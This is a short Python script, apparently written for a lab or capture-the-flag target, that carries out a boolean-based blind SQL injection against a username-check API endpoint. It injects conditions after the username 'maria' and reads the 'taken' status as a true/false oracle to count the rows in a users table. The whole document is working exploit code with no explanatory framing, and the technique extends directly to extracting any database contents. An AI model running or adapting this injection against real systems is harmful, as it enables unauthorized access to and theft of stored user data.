#!/usr/bin/python3

import requests
import json
import sys
from urllib.parse import quote_plus

# The user we are targeting
target = "maria"
ip = "10.129.204.197"
# Checks if query `q` evaluates as `true` or `false`
def oracle(q):
    p = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(
        f"http://{ip}/api/check-username.php?u={p}"
    )
    j = json.loads(r.text)
    return j['status'] == 'taken'

# Get rows in users table
rows = 100
while rows > 0:
    query = f"(select count(*) from users) = {rows}"
    status = oracle(query)
    if status:
        break
    else:
        rows -= 1

print(rows)